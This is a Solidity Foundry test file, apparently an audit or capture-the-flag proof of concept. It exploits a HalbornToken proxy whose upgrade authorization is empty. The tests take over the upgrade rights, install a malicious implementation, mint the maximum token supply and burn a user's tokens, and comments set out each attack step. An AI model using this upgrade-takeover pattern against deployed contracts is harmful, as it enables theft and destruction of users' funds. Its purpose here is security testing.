// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornToken} from "../src/HalbornToken.sol";

import {Token_UUPSattack} from "../src/exploit/HalbornTokenExploit.sol";

/**
 * @title HalbornToken_Test - UUPS and Access Control Exploits
 * @dev This contract demonstrates multiple critical vulnerabilities in HalbornToken:
 *
 * EXPLOIT VECTORS COVERED:
 * 1. UUPS Upgrade Bypass (Critical) - Anyone can upgrade the contract
 * 2. Loans Address Manipulation (Critical) - Set arbitrary minter/burner
 * 3. Unlimited Token Minting (Critical) - Create infinite token supply
 * 4. Unlimited Token Burning (Critical) - Destroy any user's tokens
 *
 * ROOT CAUSE: Empty _authorizeUpgrade() + missing access controls on critical functions
 * IMPACT: Complete token protocol takeover, infinite inflation, user fund destruction
 */
contract HalbornToken_Test is Test {
    HalbornToken public token;
    ERC1967Proxy proxy;
    HalbornToken impl;

    address hexWraith = address(0x999);

    function setUp() public {
        vm.startPrank(hexWraith);
        impl = new HalbornToken();
        proxy = new ERC1967Proxy(address(impl), "");
        token = HalbornToken(address(proxy));
        token.initialize();
        token.setLoans(address(1));
    }

    // Critical Exploit 1: anyone can upgrade
    /**
     * @dev EXPLOIT: UUPS Upgrade Takeover Attack
     *
     * VULNERABILITY: HalbornToken has empty _authorizeUpgrade() function
     * ATTACK VECTOR: Deploy malicious implementation and upgrade to it
     *
     * EXPLOIT STEPS:
     * 1. Deploy malicious token implementation (Token_UUPSattack)
     * 2. Call upgradeToAndCall() to replace legitimate implementation
     * 3. Re-initialize with attacker as owner
     * 4. Now attacker controls entire token contract
     *
     * IMPACT: Complete token protocol takeover, can mint/burn at will
     */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Step 1: Deploy malicious token implementation
        Token_UUPSattack attack = new Token_UUPSattack();

        // Step 2: CRITICAL - Upgrade to malicious implementation (no authorization)
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Step 3: Re-initialize with attacker as owner
        token.initialize();
    }

    // Critical Exploit 2: setLoans can be set to arbitrary address
    /**
     * @dev EXPLOIT: Loans Address Manipulation Attack
     *
     * VULNERABILITY: Post-upgrade, attacker can set arbitrary loans address
     * ATTACK VECTOR: Set attacker's address as authorized minter/burner
     *
     * EXPLOIT STEPS:
     * 1. Upgrade to malicious token implementation (attacker becomes owner)
     * 2. Call setLoans() with attacker's address
     * 3. Now attacker can call mintToken() and burnToken() directly
     * 4. Original owner can no longer change loans address
     *
     * IMPACT: Complete control over token supply, can mint/burn at will
     */
    function test_setLoansAddress() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Step 2: CRITICAL - Set attacker as authorized loans contract
        token.setLoans(address(this));
        assertEq(token.halbornLoans(), address(this));

        // Step 3: Verify original owner can no longer change loans address
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Should revert because attacker is now owner
        token.setLoans(address(0x10));
    }

    // Critical Exploit 3: unlimited minting of token
    /**
     * @dev EXPLOIT: Unlimited Token Minting Attack
     *
     * VULNERABILITY: Post-upgrade, attacker can mint unlimited tokens
     * ATTACK VECTOR: Direct access to mintToken() function after setLoans()
     *
     * EXPLOIT STEPS:
     * 1. Upgrade to malicious implementation (attacker becomes owner)
     * 2. Call mintToken() with maximum uint256 value
     * 3. Attacker now has infinite tokens
     * 4. Original owner cannot mint anymore
     *
     * IMPACT: Infinite token supply, economic collapse, attacker controls economy
     */
    function test_unlimitedMint() public {
        address unauthorizedUser = address(0xdead);

        // PROOF: State before exploit
        uint256 attackerBalanceBefore = token.balanceOf(address(this));
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceBefore);
        console.log("Total token supply:", totalSupplyBefore);
        console.log("Attacker can mint unlimited tokens:", false);

        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Step 2: CRITICAL - Mint maximum possible tokens to attacker
        token.mintToken(address(this), type(uint256).max);

        // PROOF: State after exploit
        uint256 attackerBalanceAfter = token.balanceOf(address(this));
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceAfter);
        console.log("Total token supply:", totalSupplyAfter);
        console.log(
            "Tokens minted:",
            attackerBalanceAfter - attackerBalanceBefore
        );
        console.log(
            "Infinite minting achieved:",
            attackerBalanceAfter == type(uint256).max
        );

        // Step 3: Verify attacker has infinite tokens
        assertEq(token.balanceOf(address(this)), type(uint256).max);

        // Step 4: Verify original owner cannot mint anymore
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Should revert because attacker is now owner
        token.mintToken(address(this), 1e18);
    }

    // Critical Exploit 4: loss of user funds via burn
    /**
     * @dev EXPLOIT: Unlimited Token Burning Attack
     *
     * VULNERABILITY: Post-upgrade, attacker can burn any user's tokens
     * ATTACK VECTOR: Direct access to burnToken() function after upgrade
     *
     * EXPLOIT STEPS:
     * 1. Legitimate user (Alice) has tokens in their account
     * 2. Attacker upgrades to malicious implementation
     * 3. Attacker calls burnToken() to destroy Alice's tokens
     * 4. Alice loses all tokens, attacker can target multiple users
     *
     * IMPACT: Mass fund destruction, griefing attack, user financial loss
     */
    function test_unlimitedBurn() public {
        address alice = address(0x123);
        deal(address(token), address(alice), 100e18);

        // PROOF: State before exploit
        uint256 aliceBalanceBefore = token.balanceOf(address(alice));
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("BEFORE EXPLOIT:");
        console.log("Alice token balance:", aliceBalanceBefore);
        console.log("Total token supply:", totalSupplyBefore);
        console.log("Alice tokens can be burned by attacker:", false);

        // start attack
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Step 2: CRITICAL - Burn ALL of Alice's tokens without permission
        token.burnToken(address(alice), token.balanceOf(address(alice)));

        // PROOF: State after exploit
        uint256 aliceBalanceAfter = token.balanceOf(address(alice));
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("\nAFTER EXPLOIT:");
        console.log("Alice token balance:", aliceBalanceAfter);
        console.log("Total token supply:", totalSupplyAfter);
        console.log(
            "Tokens burned from Alice:",
            aliceBalanceBefore - aliceBalanceAfter
        );
        console.log("Alice completely drained:", aliceBalanceAfter == 0);

        // Step 3: Verify Alice lost all tokens
        assertEq(token.balanceOf(alice), 0);

        // Step 4: Verify original owner cannot regain control
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Should revert because attacker owns upgrade rights
        token.upgradeToAndCall(
            address(impl),
            abi.encodeWithSelector(token.initialize.selector)
        );
    }

    receive() external payable {}
}
